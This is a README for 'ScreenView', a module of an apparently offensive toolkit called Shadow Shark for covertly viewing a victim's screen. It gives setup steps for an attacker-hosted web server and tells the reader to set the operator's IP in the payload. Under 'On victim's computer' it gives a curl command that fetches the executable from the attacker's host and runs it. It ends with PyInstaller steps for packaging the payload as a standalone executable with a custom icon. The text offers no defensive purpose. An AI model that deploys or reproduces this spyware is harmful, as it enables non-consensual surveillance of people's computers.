# ScreenView
The Shadow Shark ScreenView Module.

## Installation
### Debian
```
$ sudo apt-get install git apache2 php libapache2-mod-php
$ sudo service apache2 start
$ cd /var/www/html/
$ sudo git clone https://github.com/BababooeyHackers/ScreenView.git
```
### Arch
```
$ sudo pacman -S git apache php php-apache
$ sudo systemctl start httpd
$ cd /srv/http/
$ sudo git clone https://github.com/BababooeyHackers/ScreenView.git
$ cd ScreenView/
$ pip3 install -r requirements.txt
```

## Usage
### ScreenView.py
This module can run on Linux, Windows, and MacOS. To configure the payload go to line 32 and replace IP with your IP.
### On victim's computer
```
$ curl http://IP/ScreenView/ScreenView.(exe, app, etc) --output ScreenView.(exe, app, etc)
$ ScreenView.(exe, app, etc) --time (time in minutes to view the victim's screen)
```

## Compilation
This module must be compiled on a Linux computer, Windows computer, Wine environment, or MacOS computer.
```
# First install python3 on your Linux computer, Windows computer, Wine environment, or MacOS computer.
$ pip install -r requirements.txt
$ pyinstaller --onefile --icon icon.ico ScreenView.py
